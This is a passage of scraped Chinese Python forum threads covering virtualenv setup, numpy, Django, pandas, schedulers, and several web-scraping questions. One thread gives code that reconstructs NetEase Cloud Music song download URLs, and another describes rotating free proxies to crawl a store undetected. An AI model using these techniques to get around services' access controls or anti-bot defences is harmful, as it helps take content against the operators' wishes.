{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前不知道，还傻乎乎得修改 launch.json 配置文件</p>\n<p>今天才发现原来在命令行激活虚拟环境后，直接用 code 打开项目文件夹就行了。。。</p>\n<pre><code>XXX&gt;venv\\scripts\\activate\n(venv) XXX&gt;code project_name/\n</code></pre>\n<p>Win 系统</p>\n</div></div>"], "reply": "3", "tittle": "原来让 vscode 支持 virtualenv 这么简单", "comment": ["python 的话，如果要语法提示补全，还是要把 site-packages 加入到 settings.json 中", "为什么我感觉还不如修改 launch.json 呢. 你这样岂不是每次打开都要输入一次命令.", " 可以写一个批处理"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>把自己发的微博爬下来，用 numpy 和 matplotlib 绘制而成图片，图片中的文字是微博中出现频率最高的词语</p>\n<p>完整代码：<a href=\"https://github.com/lzjun567/crawler_html2pdf/tree/master/heart\" rel=\"nofollow\">https://github.com/lzjun567</a></p>\n<p>创意思路：<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5MzgyODQxMQ==&amp;mid=2650366775&amp;idx=1&amp;sn=3fbf6f64304e528ddad88c0f6eb922e1&amp;chksm=be9cd86389eb5175882c5666ac5ee7fe936a7b32b705244a87ce34eadfdf33f5a11236be4445&amp;mpshare=1&amp;scene=23&amp;srcid=0215AAinxzHfYCxNvblNQuTf#rd\" rel=\"nofollow\">http://mp.weixin.qq.com/</a>\n<img alt=\"image\" src=\"https://dn-mhke0kuv.qbox.me/1b7ba68c22fa82374ab2.jpg\"></p>\n</div></div>"], "reply": "9", "tittle": "用 Python 把微博数据绘制成一颗“心”", "comment": ["不明觉厉", "哥们，真 666", "分词是怎么处理的？", " 看代码是结巴分词", " 是用的结巴分词，不过它的局限在在于没法处理 HTML 标签。论英文分词还是 Java 中的 Lucene 牛", "挺有想法的", "马克下", " 为啥要处理 HTML ，用 bs4 直接 text 过滤掉啊。", "$ python heart.py\r", "Traceback (most recent call last):\r", "  File \"heart.py\", line 9, in <module>\r", "    from scipy.misc import imread\r", "  File \"d:\\python3\\lib\\site-packages\\scipy\\__init__.py\", line 61, in <module>\r", "    from numpy._distributor_init import NUMPY_MKL  # requires numpy+mkl\r", "ImportError: cannot import name 'NUMPY_MKL'\r", "\r", "\r", "这个怎么办？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>可能标题说的不太明白</p>\n<p>代码从文件读取数据，然后转为 3d array ，之后 append 到一个 list ，但是每个 array 的 shape 不一定相同，这样无法直接转为 numpy.array. 比如有的是(1, 2, 3)，但有的就是(1, 2, 5)，我想把每个 array 都转成最长的(1, 2, 5)，多余部分填 0</p>\n<p>我现在用的代码是：</p>\n<pre><code>max_len = np.max([item.shape[2] for item in old_array])\nnew_array = np.zeros((len(old_array), 1, 2, max_len))\nfor index, data in enumerate(old_array):\n    new_array[index][:, :, :data.shape[2]] = data\n</code></pre>\n<p>有更好的实现方式吗？</p>\n</div></div>"], "reply": "2", "tittle": "初学 Python ， Numpy 如何将包含不同大小 3d-array 的 list 转为大小相同的 4d-array 呢？", "comment": ["我觉得你这已经是最好的方法了……\r", "\r", "如果你事先知道 maxlen 的话，你可以用 numpy.pad 处理每一条记录。", "r#1 @", " 就是不知道 max_len 才比较纠结，暂时这么处理了，也没有什么性能要求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>sess=requests.session()\nresp=sess.get('http://www.so.com')\nf=open('cookiefile','wb')\npickle.dump(resp.cookies,f)  #为什么很多代码都不是这样,而是使用 cookielib 的 LWPCookieJar?\nf.close()```\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "Python 为什么不使用 pickle 来直接序列化 requests.的 session.cookies 而常用 cookielib.LWPCookieJar 呢?", "comment": ["Warning The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.", "这么说吧，除了 json 反序列化。。。。别的二进制的 /语言特性相关的，都不太安全", "读文档不仔细了吧(๑`･ᴗ･´๑)", "cookie 属于用户输入数据\r", "反序列化用户输入数据不安全", "感谢各位热情回复!\r", "原来如此.\r", "英文读懂了 4 分!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>可以一步一步观察正则运算过程的工具~~</p>\n<p>有咩？</p>\n</div></div>"], "reply": "12", "tittle": "Mac 上面，有没有像 windows 上 regexbuddy 的工具", "comment": ["可以用 crossover 装一个", "Reginald ，可以试一下", "借楼问一下，有没有 Linux 版的这种工具，不要 wine 或虚拟机，因为文本量大了会卡死", " 这个在线工具可以吗？", "好东西啊。想找个 awesome linux 了.", "atom 的这个插件很好用\r", "Expressions.app", " 还真有 ", " \r", "\r", "搜了一下， vscode 上已有移植\r", "\r", "谢谢", "推荐这个，可以单步调试，看到正则扫描过程，在线版： ", " mac 客户端 ", " ，媲美 windows 下的 RegexBuddy"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如已有一个网站 A ，用户表已经有很多数据，字段也很多。用户表跟支付功能，订单功能等等也有很多关联</p>\n<p>现在要新建一个网站 B ，功能很简单，只会用到 A 网站用户表中用户名、密码、身份证等几个字段</p>\n<p>需要 A 网站的用户，可以直接来 B 网站登录</p>\n<p>应该如何实现呢…？</p>\n</div></div>"], "reply": "9", "tittle": "[求教] Django 中不同项目想共用一个数据库表，应该怎么做？", "comment": ["难道不是连同一个数据库就可以了？", "为啥要放在一个表？", "你的功能属于统一登录，再进一步就是 sso 单点登录，现在基于 cas 的方案比较靠谱，也可以用 jwt 实现", " 瞬间把撸主搞迷糊了，\\\\偷笑", "B 站收集账号密码等信息 然后 A 站验证就行了啊 不是吗?", "撸主一定是要 B 站自动获得 A 站的身份。如果 B 站还需要额外收集一次账号密码，那直接查库就是了，不用专程来提问了。\r", " 方案正解。\r", "\r", "PS ： A 站 B 站势如水火，确定共享身份不会打起来？/手动滑稽", "单点登录  SSO   OAuth 之类的，或者共用 session 中间件", "连多个 database, 从 A 里读用户信息\r", "\r", "最简单的方法，自定义认证，抄原来的，改数据库连接就可以了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>无聊时候断断续续写的个人博客程序.现在已经基本成型了.登录,注册,评论等功能已经基本都有了.</p>\n<p>Github 地址: <a href=\"https://github.com/liangliangyy/DjangoBlog\" rel=\"nofollow\">https://github.com/liangliangyy/DjangoBlog</a></p>\n<p>线上地址:  <a href=\"https://www.lylinux.net/\" rel=\"nofollow\">https://www.lylinux.net/</a></p>\n<p>欢迎大家 star.提 pr.这个博客程序是边翻文档边写的.有的地方还不是很完善.欢迎大家指正.</p>\n</div></div>"], "reply": "27", "tittle": "基于 Django 的个人博客", "comment": ["楼主登陆界面咋那么像 wordpress ！！！！", " 明明是 Google", " 哈哈哈是的.登录界面是模仿 Google 的.然后前端是模仿 wordpress 的主题的", "登录...", " 嗯嗯 还是有 bug.我也发现了.周末修掉~~", " 哈哈，登陆页面不错，档次一下就提高了", " 哈哈 是也乎 是也乎.", "登陆->登录", " 嗯哼 感谢指正~~", "好慢， 15s 才打开。。。", " 嗯嗯 linode 东京 2 机房.有些地区可能会很慢...", "need help ...", "应该把评论换成 disqus ，现在的太丑了", " 国内机房太贵了，而且不划算，我直接用 hexo 了， coding 托管，速度还行 ", " 嗯嗯是的.国内还要备案.烦得要死.坚决抵制!", "看了下代码，写得不错，默默 FORK 来学习", " 嗯嗯 当时就是想着自己实现所有的功能.但是毕竟前端渣...评论界面这块是要改下呢~~\r", "\r", "不过打算实现下第三方登录的.oauth 的功能.这样只留一个留言框会好点儿~~", "哈哈 感谢大家的测试.收到三四封异常邮件了~~周末一并修掉~~~", "前端也都自己写吗？", " 不是的哈.前端是模仿 wordpress 的主题的哈", "create an account 还是 sign in\r", "还有登录和登陆", " 嗯嗯 感谢.周末改掉~~", "评论直接用多说吧，本来也想自己开发的，但是越了解感觉坑越大。。还是暂且放弃了", " 就是因为多说垃圾评论太多了然后才弃用的～～", " hhh, 好吧。。过段时间我也试试加上评论模块", "大家不要只收藏帖子呀~~点点 star 点点 fork 也是阔以滴~~ \r", "\r", "后面会继续完善滴~~", "大家都是怎么用缓存的，类似这样的博客大家有没有什么缓存使用的经验或者想法意见呀，现在缓存这儿有点不确定改怎么用。"]},
{"content": ["<div class=\"topic_content\">对运算要求比较高的程序， 会有比较大的性能差别吗？</div>", "<div class=\"topic_content\">同样硬件配置环境下， 相同 CPU / MEMORY / HARD DISK\r<br>\r<br>同样硬件配置环境下， 相同 CPU / MEMORY / HARD DISK\r<br>\r<br>同样硬件配置环境下， 相同 CPU / MEMORY / HARD DISK</div>", "<div class=\"topic_content\">只是单纯比较相同程序代码的性能， 不谈如何用 C 或者其他的方法改进提高性能。\r<br>\r<br>只是单纯比较相同程序代码的性能， 不谈如何用 C 或者其他的方法改进提高性能。\r<br>\r<br>只是单纯比较相同程序代码的性能， 不谈如何用 C 或者其他的方法改进提高性能。</div>"], "reply": "38", "tittle": "有人比较过同样的 Python 程序，在 Mac 上和 Linux 下的性能差别吗？ 稳定性？", "comment": ["应该都不会特别快。。", "对运算要求比较高的程序，不要用 Python 来写。除非主要是用 Python 的各种 C 模块。\r", "\r", "Mac OS 和 Linux 没有比较过，不发表意见。", "不用 C 模块来比,一样慢哈哈哈哈哈哈哈\r", "差不了多少,求安慰的话,win 的更慢,有安慰吗?\r", "(含泪带笑", "写过一些，，速度上一般是 linux>win>Mac", "注重运算还是 C 吧。", "运算比较高的就得用 numpy 之类的，速度不差，挺稳定的。", "难道跟硬件没关系吗？", " 你确定？ windows 什么时候这么牛了😂", " 我的代码比出来的啊，，一开始我也吃惊。。", "c 或者 go", "什么时候 pythoner 这样了？性能敏感了？\r", "\r", "一起来 go go go 。", "你是说再考虑应该在生产环境用 Linux 还是 Mac ？", "  对～", " 为什么会考虑用 Mac 作为服务器呢", "这个问题问得毫无意义，因为\r", "\r", "如果你想，就可以写一段代码使之在 Linux 上快，也可以写一段代码使之在 Darwin 上快，也可以写一段代码使之在 Windows 上快\r", "而且和操作系统的版本也有关系\r", "\r", "真需要作这种决定，就用真实的条件做性能测试", " 嗯，我就是不想再花时间去在同一台机器上花时间去测试性能问题，所以问问看是不是有朋友之前做过类似的测试。 只要差别不大，比如 20%以内，也无所谓。", " 王垠说 go 是垃圾", " 王垠是谁？\r", "\r", "\r", "垠，读 yin2 。对，我刚查的如何读，我打拼音的。", "其实就是 linux 和 unix 的性能对比，可以负责的告诉你， linux 下 py3 比 unix 的 py3 快那么一点。不到 10%", "PS ：只要你不涉及 UI 部分", "觉得既然用 python 了还是别纠结性能了。。\r", "如果实在对性能有要求，可以考虑用 go", " 小朋友", "没差~", "python 优势不不在于性能啊 * 3", "生产环境为何考虑 Mac 呢，难道拿本机做服务器？", "我是今天才知道 Mac 有机架式服务器的。有和我一样的吗？", " apple 不出服务器，但是他有服务器版本的操作系统", " 除了搭建 iOS 的 CI 服务器，没看出有什么非用不可，而且我是很怀疑在机房托管垃圾桶的成本会不会太高了", "Mac 跑 Python 速度渣爆了，我试过在 Mac 和装在 Windows 中的 Linux 虚拟机同时跑单线程 jieba 分词操作， Mac 的速度还不如 Linux 的一半。顺便说一下， Mac 是 2.6GHz ， Linux 那边是 4.0GHz 。", "什么叫你说的那种稳定性？", " 为啥不能在 dell 的机架服务器上装 mac 的服务器操作系统，具体没有用过不清楚，只是有不表示一定要用，据说 apple 自己的所有服务都用的自己的操作系统。", " EULA 规定了 Server 版也只能安装在苹果电脑上，而且众所周知，苹果使用大量的 AWS 跟 Azure 服务，在现代操作系统没有一个高效的 IO multiplxer 或者异步 IO 的话，都是垃圾。 Tornado 那边的文档都写了，不要将运行在 OS X 上面的 Tornado 实例用于生产， kqueue 在 OS X 上面是残废的。", " 这里小白太多。 Linux 下一般能快 5%。如果使用了一些第三方的包，而这些包里有 c 的模块，一般情况下 Linux 下更快一些，而且内存占用也少。总体看 Windows 下面内存占用量更高，速度也慢一些。主要原因应该还是开发者使用 Linux 的更多些。", " 已查证，你说的基本是对的", "cpu 密集型，看 CPU ，编译器优化，跟操作系统关系不大。网络型，看事件模型，也就是 epoll 和 kqueue 。", "比一下 PowerPC 上的 Python ？", " 垠神都不知道，一个装逼能装到你心服口服的人。 ", " 其实我是知道的，只是我根本不鸟这些撕逼，自己看好就行。"]},
{"content": ["<div class=\"topic_content\">机器上的 python 环境是好的， pycharm 和 sublime 都可以正常运行 python\r<br>\r<br>\r<br>今天用 Delphi 程序 loadlibrary 却死活无法加载 python36.dll ， getlasterror 返回 126</div>"], "reply": "4", "tittle": "加载 python36.dll 失败怎么破", "comment": ["题外话，我觉得选 py2 py3 被 overrated 了。首先你得放弃 windows 。", " py3 在 windows 上不是挺好的么", "重装一下试试？", "用 sxstrace 查看一下"]},
{"content": ["<div class=\"topic_content\">请问大家有遇到过这种问题么， stackoverflow 的 import django ； django.setup()解决办法不可用。  如果在服务器上不适用 xadmin ，就可以正常启动\r<br>具体错误\r<br>Traceback (most recent call last):\r<br>  File \"manage.py\", line 10, in &lt;module&gt;\r<br>    execute_from_command_line(sys.argv)\r<br>  File \"/usr/lib/python2.7/site-packages/django/core/management/__init__.py\", line 338, in execute_from_command_line\r<br>    utility.execute()\r<br>  File \"/usr/lib/python2.7/site-packages/django/core/management/__init__.py\", line 312, in execute\r<br>    django.setup()\r<br>  File \"/usr/lib/python2.7/site-packages/django/__init__.py\", line 18, in setup\r<br>    apps.populate(settings.INSTALLED_APPS)\r<br>  File \"/usr/lib/python2.7/site-packages/django/apps/registry.py\", line 108, in populate\r<br>    app_config.import_models(all_models)\r<br>  File \"/usr/lib/python2.7/site-packages/django/apps/config.py\", line 198, in import_models\r<br>    self.models_module = import_module(models_module_name)\r<br>  File \"/usr/lib64/python2.7/importlib/__init__.py\", line 37, in import_module\r<br>    __import__(name)\r<br>  File \"/usr/lib/python2.7/site-packages/xadmin/models.py\", line 19, in &lt;module&gt;\r<br>    AUTH_USER_MODEL = django.contrib.auth.get_user_model()\r<br>  File \"/usr/lib/python2.7/site-packages/django/contrib/auth/__init__.py\", line 150, in get_user_model\r<br>    return django_apps.get_model(settings.AUTH_USER_MODEL)\r<br>  File \"/usr/lib/python2.7/site-packages/django/apps/registry.py\", line 199, in get_model\r<br>    self.check_models_ready()\r<br>  File \"/usr/lib/python2.7/site-packages/django/apps/registry.py\", line 131, in check_models_ready\r<br>    raise AppRegistryNotReady(\"Models aren't loaded yet.\")\r<br>django.core.exceptions.AppRegistryNotReady: Models aren't loaded yet.</div>"], "reply": "5", "tittle": "django1.8 与 django xadmin 的使用问题，我本地使用 django+xadmin 都是可以正常启动的，但是在 centos7 上启动启动报错，", "comment": ["刚入 xadmin 的时候也很烦，后来 xadmin 作者现场指点我，才发现 xadmin 封装的简直是完美。你明明就是加载 model 失败了， django 版本是什么？", "换成 django 版本 1.74", " django 是 1.8 版本， python 是 2.7.6\r", "\r", "但是我本地的 winodws 环境是没问题的，不会提示加载 model 失败", " 并且 xadmin 依赖的几个库都加上了，\r", "INSTALLED_APPS = (\r", "    'django.contrib.admin',\r", "    'django.contrib.auth',\r", "    'django.contrib.contenttypes',\r", "    'django.contrib.sessions',\r", "    'django.contrib.messages',\r", "    'django.contrib.staticfiles',\r", "    'django.contrib.sitemaps',\r", "    'tinymce',\r", "    'xadmin',\r", "    'crispy_forms',\r", "    #'reversion',\r", "    'blog',\r", "    'vmaig_auth',\r", "    'vmaig_comments',\r", "    'vmaig_system'\r", ")", "看一下服务器上面的 python 版本是不是一致（小版本也要一致），\r", "服务器上面装一个 Anaconda 吧。省的缺东少西的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 requests 模拟网易云音乐的登录，运行下面这段代码，代码会立即闪退，感觉似乎根本没有做 post 请求，请问原因可能是什么，程序退出的速度太快了。</p>\n<pre><code>import requests\n\n\ndef login(username, password):\n    session = requests.Session()\n    url = 'https://music.163.com/weapi/login/'\n    headers = {\n        'Cookie': 'appver=1.5.2', 'Referer': 'http://music.163.com/', \n        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36'\n    }\n\n    text = {\n        'username': username,\n        'password': password,\n        'rememberLogin': 'true'\n    }\n    data = encrypted_request(text)\n    try:\n        r = session.post(url, data=text, headers=headers)\n        print r.text\n    except requests.exceptions.RequestException as e:\n        print e\n\n# 邮箱登录\nlogin('xxx@163.com', 'password')\n</code></pre>\n<p>encrpted_requests 的地址 <a href=\"https://gist.github.com/ormsf/130d72fe0c81cbf48e4c357dfe94a4c8\" rel=\"nofollow\">https://gist.github.com/ormsf/130d72fe0c81cbf48e4c357dfe94a4c8</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><code>data = encrypted_request(text)</code>要改成<code>data = encrypted_request(data)</code>。只是这样还是会502错误。</p>\n</div></div>", "<div class=\"topic_content\">附言 1 写错了：\r<br>是`r = session.post(url, data=text, headers=headers)`改成`r = session.post(url, data=data, headers=headers)`</div>"], "reply": "2", "tittle": "网易云音乐 post 请求闪退的原因有哪些？", "comment": ["没跑 ， 但是你 post 的 data 还是用的没加密的 text 字典 这个有问题吧", " 找了一个上午，多谢:P 。只是返回的状态码是 502 ，我重新试下。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>尝试解析电脑端网易云音乐的加密方式，但太复杂了，决定放弃。在 GitHub 上看了一下其他朋友的项目，发现他们基本都是通过移动端抓取的。之前爬过知乎用移动端的 api 确实要方便很多，所以我也决定从移动端(Android)来解析。</p>\n<p>我使用的抓包工具是 Ubuntu 版本的 Charles4.02 ，但是不知道为什么使用 Charles 可以抓取<strong>知乎</strong>等 app 的 api 包都可以正确解析，唯独网易云音乐的包解析不了。</p>\n<p>从下面截图可以看出，知乎的每一个包我都可以正确抓取到：</p>\n<p><img alt=\"Charles\" src=\"http://upload-images.jianshu.io/upload_images/4003106-e33227f0a911e482.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"SSL\" src=\"http://upload-images.jianshu.io/upload_images/4003106-d72fb450c1b92211.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>请问 V 站的各位朋友使用 Charles 遇到过这种情况吗？能不能推荐一下相关的解决方法？</p>\n</div></div>"], "reply": "4", "tittle": "Charles 无法抓取网易云音乐 app 的包？", "comment": ["记得 Charles 只能抓取 http 吧", "ssl pinning", "我们自己产品测试环境的 https 可以抓到，然后正式环境的 https 就解析不了。估计可能网易云也作了限制吧", " 好像是这个原因。"]},
{"content": ["<div class=\"topic_content\">python 操作 Jenkins 遇到\r<br>jenkins.JenkinsException: Error in request. Possibly authentication failed [500]: Internal Server Error\r<br>谷歌了一下，貌似是个 bug\r<br>有人遇到过么，最后怎么解决的</div>"], "reply": "3", "tittle": "Python 操作 Jenkins 报 500", "comment": ["看报错是认证失败啊\r", "\r", "另外 Jenkins 有两个流行的库，你用的是哪个库啊", " 不是认证失败， server = jenkins.Jenkins(jenkins_url, username=user_id, password=api_token)\r", "print server.reconfig_job('xxxx', xml)\r", "就这个接口，我其他的 get 类接口都没问题", "看一下 jenkins 的 log ，我之前也遇到过类似错误。"]},
{"content": "", "reply": "4", "tittle": "为什么在我的 mac os 和 win7 下面，都没有找到 PYTHONPATH， PYTHONHOME 等关于 Python 的环境变量？", "comment": ["我也没有\r", "\r", "为啥需要有？", "对啊，为什么要有= =", "你一定看了过时的教程\r", "\r", "JDK 现在也不需要手动添加 PATH", "python 都不在 可执行目录下面么\r", "不用指定 path"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>alembic</h3>\n<p>1 .配置完所有的文件后,输入<code>alembic upgrade head</code>了一个<code>Can't locate revision identified by '0aad1fa0f8d2'</code></p>\n</div></div>"], "reply": "3", "tittle": "谁使用过 flask 框架下的 alembic 插件", "comment": ["一个原因是你可能删除了 migrations 文件夹，而数据表里面有一个 alembic 表里存在着 0aad1fa0f8d2 导致的，对应这一原因的解决方式，删除这个数据行", "已经解决了，删除了那个数据库然后重新建立一个就好了，或者删除 alembic_version 这个表然后重新运行也是一样的", "flask 的话可以用用 flask-migrate 哦，是对 alembic 的一个封装，相当于 flask-sqlalchemy 之于 sqlalchemy"]},
{"content": ["<div class=\"topic_content\">最近在做的一个内部系统，需要引入工单审批处理流程，所以请问各位大神， python 下有无好用的开源工作流引擎？ thx</div>"], "reply": "6", "tittle": "Python 下的开源工作流", "comment": ["fixflow", " 这个不是 java 的么？", "同问", " 看错", "taskflow  openstack 出品"]},
{"content": ["<div class=\"topic_content\">希望能够支持精确到秒级的计划任务设定，比如将计划任务持久化到数据库中，然后这个程序可以从数据库中读取出计划任务；在任务没有开始执行之前，可以停止或者修改任务的执行时间；这两天看了下 Celery ，感觉 Celery 的计划任务都是要写到代码里的，好像不支持从数据库中读取。</div>"], "reply": "12", "tittle": "想用 Python 做个计划任务管理、调度的系统，有哪些成熟的开源产品或者模块？", "comment": ["crontab 满足需求吗", "autotest 吧，不过本质上是用来调度测试任务的，后台用的 mysql ， python 写的 scheduler （调度器），你可以参考下他的调度器和数据库交互的方法", "pycorntab", "buildbot,不过 buildbot 只能用配置文件,不能从 web 上修改\r", "\r", "或者你用非 py 的 jenkins,不过这个也不是记到数据库,这个是记到文件里", "apscheduler", "Luigi", "为公司做了一个定时调度系统，使用 linux 系统计时器精确到秒级定时，只是定时和超时两种计划方式，支持未到时间之前修改，使用 redis 做后端持久化存储，在每天处理的计划任务差不多数百万这样子能稳定运行，本来想搞一搞看看能不能开源，做了一半又撂那了。。。", "\r", "apscheduler 支持持久化到数据库", "airflow", "我之前用 apscheduler  扩展了一个， 不过这个性能并不是很好", " incubator-airflow 这个看了下，感觉不错，准备研究一下"]},
{"content": ["<div class=\"topic_content\">数据如下：\r<br>\r<br>A     |     B\r<br>-------------\r<br>1     |     0.2\r<br>-------------\r<br>1     |     0.3\r<br>-------------\r<br>1     |     0.4\r<br>-------------\r<br>2     |     0.1\r<br>-------------\r<br>3     |     0.2\r<br>-------------\r<br>3     |     0.4\r<br>\r<br>\r<br>按 A 列去重，保留 B 列中 最小的一行数据。</div>"], "reply": "4", "tittle": "pandas 如何按条件去重？", "comment": ["groupby min", "或者 sort_values 然后 drop_duplicates", "```\r", "import pandas as pd\r", "data = [[1,1,1,2,3,3], [0.2,0.3,0.4,0.1,0.2,0.4]]\r", "data = pd.DataFrame(data)\r", "data = [[1,1,1,2,3,3], [0.2,0.3,0.4,0.1,0.2,0.4]]\r", "data = pd.DataFrame(data).T\r", "data.columns=['A', 'B']\r", "data.groupby('A').max()\r", "```", "推荐 groupby('A', as_index=False)['B'].min()  比较直接. \r", "\r", "\r", "另外也推荐看一看 pivot_table 函数,  更是强大.\r", "```\r", "df.pivot_table(index='A', columns=None, values='B', aggfunc=min)\r", "```"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前开源爬虫代理框架 IPProxyTool 收到很多 V 友的好评。但是也有一些疑惑，所以使用 IPProxyTool 抓取并验证后的代理 IP 抓取 unity 官方插件商店 [AssetStore] ( <a href=\"https://www.assetstore.unity3d.com/\" rel=\"nofollow\">https://www.assetstore.unity3d.com/</a>) 历时四个小时共抓取 AssetStore 商店 34131 个插件信息。而且没有被 AssetStore 反爬策略发现。验证了 IPProxyTool 工具提取到的代理 IP 的有效性。</p>\n<p>IPProxyTool github 地址： <a href=\"https://github.com/awolfly9/IPProxyTool\" rel=\"nofollow\">https://github.com/awolfly9/IPProxyTool</a><br>\n抓取 Unity 官方插件商店 AssetStore github 地址： <a href=\"https://github.com/awolfly9/unity\" rel=\"nofollow\">https://github.com/awolfly9/unity</a></p>\n</div></div>"], "reply": "4", "tittle": "[开源] 使用爬虫代理框架 IPProxyTool 提取到的免费代理 IP 抓取 Unity3D 官方插件商店 AssetStore 共 34131 个插件信息", "comment": ["这段介绍文字有种毕业论文的感觉", " 表示没有写过毕业论文", "系编译好了的吗", "不错啊，现在花钱买的感觉也不怎么样，试试楼主这个"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在学习爬网易云的歌曲，在获取单首歌曲的播放地址的时候遇到了一点问题，拜托 V 站各位大神帮看下。 ps: 第一次发帖，对社区的规则还不是很熟悉。</p>\n<p><a href=\"https://github.com/darknessomi/musicbox/blob/master/NEMbox/api.py#LC81\" rel=\"nofollow\">参考 musicbox 加密算法</a>，比如我现在要抓取周杰伦的<a href=\"http://music.163.com/#/song?id=418603077\" rel=\"nofollow\">告白气球</a>，通过抓取我得到它的 dfsid 是 3435973841155597 ，现在我想通过这个破解得到这首歌的播放地址。我是下面这样做的：</p>\n<p>破解程序：</p>\n<pre><code>import hashlib\nimport base64\nimport random\n\ndef encrypted_id(id):\n    magic = bytearray('3go8&amp;$8*3*3h0k(2)2', 'u8')\n    song_id = bytearray(id, 'u8')\n    magic_len = len(magic)\n    for i, sid in enumerate(song_id):\n        song_id[i] = sid ^ magic[i % magic_len]\n    m = hashlib.md5(song_id)\n    result = m.digest()\n    result = base64.b64encode(result)\n    result = result.replace(b'/', b'_')\n    result = result.replace(b'+', b'-')\n    return result.decode('utf-8')\n</code></pre>\n<p>调用程序：</p>\n<pre><code>song_dfsId = str(3435973841155597)\nenc_id = encrypted_id(song_dfsId)\nurl = 'http://m%d.music.126.net/%s/%s.mp3' % (random.randrange(1, 3), enc_id, song_dfsId)\nprint url\n</code></pre>\n<p>输出的运行结果是：</p>\n<pre><code>http://m2.music.126.net/RMJR7wDullRqppBk8dhLow==/3435973841155597.mp3\n</code></pre>\n<p>如果直接拿上面的 url 去访问会报 403 错误，通过在浏览器下面抓包歌曲正确的 url 应该是 <a href=\"http://m10.music.126.net/20170220090502/e6fb244e65e9ee9933982e16e10c218c/ymusic/6e01/a4d4/bbef/2dda07904eb54d44abb278165e1c6ead.mp3\" rel=\"nofollow\">http://m10.music.126.net/20170220090502/e6fb244e65e9ee9933982e16e10c218c/ymusic/6e01/a4d4/bbef/2dda07904eb54d44abb278165e1c6ead.mp3</a> 。</p>\n<p>请问上面的程序出错的原因在哪里？</p>\n</div></div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/yingos\">yingos</a> 问题解决了， <a target=\"_blank\" href=\"http://m2.music.126.net/RMJR7wDullRqppBk8dhLow==/3435973841155597.mp3\" rel=\"nofollow\">http://m2.music.126.net/RMJR7wDullRqppBk8dhLow==/3435973841155597.mp3</a> 可以正确访问，昨天可能是浏览器配置有一点问题。</div>"], "reply": "18", "tittle": "关于网易云音乐单首歌曲加密算法的破解？", "comment": ["403 有可能是需要什么认证 key 或者登陆", "干嘛那么复杂 ...\r", "\r", "var httpurl = \"http://music.163.com/api/song/detail?id=\" + music_id + \"&ids=[\" + music_id + \"]\";\r", "\r", "给你摘一句 ... 去年写的，拿到的 URL 可以直接用。\r", "\r", " 应该不是登录的原因，因为 403 是到浏览器里面访问得到的，在浏览器里面我已经登录好了。感觉可能是 url 解析的不对，但是[https://github.com/darknessomi/musicbox/blob/master/NEMbox/api.py](musicbox)好像就是我这样做的，不知道我哪里理解错了？", "抓包比较一下两个 http head 的区别应该就知道了", "看你的秒速 可能是 User-Agent 字段有判断", "问题看错了 请忽略我的回答😂😂😂", "你下面的 url 浏览器直接访问也不行", "\r", "\r", "表示可以直接访问...", "我也可以直接访问，不会有 403", "我这边无法访问。", "我这边现在无法访问， 403", " \r", "\r", "可以直接访问 并且 IDM 弹出来下载的对话框了", "404 Not Found", "默默关注这个问题，搞了好久没搞出来", " 上面的代码现在是正确的，已经可以正确的获取到歌曲的地址了。", "nice mark", "请问下 dfsid  怎么获取的"]},
{"content": ["<div class=\"topic_content\">如题， 依稀的记得是一个 python 下实现的可以用程序生成电影， 名字实在想不起来叫什么。有接触过的麻烦给提示下那个代码叫什么名字，谢谢</div>"], "reply": "5", "tittle": "记得之前有个 Python 程序生成电影的框架，谁记得叫什么名？ py 高手请指教。", "comment": ["这么厉害，还能生成电影，能制造漂亮女演员嘛？", "这个： py-Aoi-sola ，还可以生成语文老师", "能生成苍老师的新作吗？苍老师宣布退役后我一直郁郁不振。", "为啥百度 aoi sola 是苍老师？", " 因为人家的名字就这么念"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>扒页面的时候，经常会遇到这种的需求：</p>\n<ul>\n<li>获取页面上所有的文章内容</li>\n<li>过滤所有 HTML 标签，仅保留图像及文字</li>\n</ul>\n<p>目前我自己提取网页文字觉得最方便的处理是这样的</p>\n<pre><code>    from bs4 import BeautifulSoup\n    html_string = \"一些 HTML 字符\" \n    soup = BeautifulSoup(html_string)\n    soup.text\n\n</code></pre>\n<p><strong>但是</strong></p>\n<p>在需要保留 IMG 标签的时候就不行了，这时候我是采用正则来过滤，不过比较丑陋。。。</p>\n<p>每次 coding 都好纠结，不知道有没有好方法，敲代码可以敲得更嗨点;)</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>非常感谢 BiggerLonger 提供的这个scrapy里的模块</p>\n<pre><code>from w3lib.html import remove_tags \n# keep参数为需要保留的标签名称\nremove_tags(text, keep=('img',)) \n</code></pre>\n</div></div>"], "reply": "12", "tittle": "怎样更优雅的过滤 HTML 标签？", "comment": ["抽象出来，不就眼不见心不烦？", "PHP:  echo strip_tags('一些 HTML 字符');\r", "\r", "别打我 逃)", "可以试试 lxml ，然后用 xpath", " 想看有没有现成的，造轮子水平不高。。", "先用正则把 img 标签找出来，替换成复杂的特殊字符文字包裹的 src 地址 text ，然后用你上文的方法替换其他标签，最后再把 img 标签转回来", "以前做富文本编辑功能的时候做过这样的东西\r", "用的方式是直接在 DOM 